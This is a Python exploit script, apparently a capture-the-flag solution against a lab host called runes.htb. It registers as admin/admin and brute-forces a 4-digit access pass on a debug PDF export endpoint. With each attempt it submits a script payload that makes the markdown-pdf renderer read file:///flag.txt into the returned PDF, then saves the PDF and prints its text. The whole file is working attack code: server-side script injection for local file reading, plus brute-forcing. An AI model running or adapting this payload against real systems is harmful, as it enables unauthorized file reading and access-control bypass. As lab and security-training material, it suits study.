#!/usr/bin/python3.11

import requests
import random
import string
import sys
import PyPDF2
from io import BytesIO
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

BASE_URL = "http://runes.htb:46710"
REGISTER_ENDPOINT = f"{BASE_URL}/register"
LOGIN_ENDPOINT = f"{BASE_URL}/login"
EXPORT_ENDPOINT = f"{BASE_URL}/document/debug/export"

# Payload provided by the user for the markdown-pdf vulnerability
PAYLOAD = """
<script>
 document.write(window.location);
 xhr = new XMLHttpRequest;
 xhr.onload=function(){document.write((this.responseText))};
 xhr.open("GET","file:///flag.txt");
 xhr.send();
</script>
"""

def random_4_digit_code():
    return ''.join(random.choices(string.digits, k=4))

def register(session):
    data = {
        "username": "admin",
        "password": "admin"
    }
    res = session.post(REGISTER_ENDPOINT, data=data, verify=False)
    print(f"[+] Registration response: {res.status_code}")
    return res.status_code in [200, 302]

def login(session):
    data = {
        "username": "admin",
        "password": "admin"
    }
    res = session.post(LOGIN_ENDPOINT, data=data, verify=False)
    print(f"[+] Login response: {res.status_code}")
    return res.status_code in [200, 302]

def extract_pdf_text(pdf_bytes):
    try:
        pdf_reader = PyPDF2.PdfReader(BytesIO(pdf_bytes))
        text = "\n".join([page.extract_text() for page in pdf_reader.pages if page.extract_text()])
        return text or "[!] No extractable text found in the PDF."
    except Exception as e:
        return f"[!] Error extracting text from PDF: {e}"

def brute_force_access_pass(session, max_attempts=2000):
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    attempts = 0

    while attempts < max_attempts:
        access_pass = random_4_digit_code()
        data = f"access_pass={access_pass}&content={PAYLOAD}"

        res = session.post(EXPORT_ENDPOINT, data=data, headers=headers, verify=False)
        attempts += 1

        if res.status_code == 200 and b"%PDF" in res.content:
            print(f"\n[+] Success after {attempts} attempts!")
            print(f"[+] Access pass: {access_pass}")
            with open("exploit_success.pdf", "wb") as pdf_file:
                pdf_file.write(res.content)
            print("[+] Saved exploit_success.pdf with extracted content:")
            print(extract_pdf_text(res.content))
            return True
        elif res.status_code == 403:
            sys.stdout.write(f"\r[-] Attempt {attempts}/{max_attempts}: Access pass '{access_pass}' invalid.")
            sys.stdout.flush()
        else:
            sys.stdout.write(f"\r[?] Unexpected status {res.status_code} at attempt {attempts}")
            sys.stdout.flush()

    print("\n[!] Brute force unsuccessful after max attempts.")
    return False

if __name__ == "__main__":
    session = requests.Session()
    session.proxies.update({
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080"
    })

    if not register(session):
        print("[!] Registration possibly failed, continuing anyway...")

    if not login(session):
        print("[!] Login failed. Cannot continue.")
        sys.exit()

    brute_force_access_pass(session, max_attempts=200000)
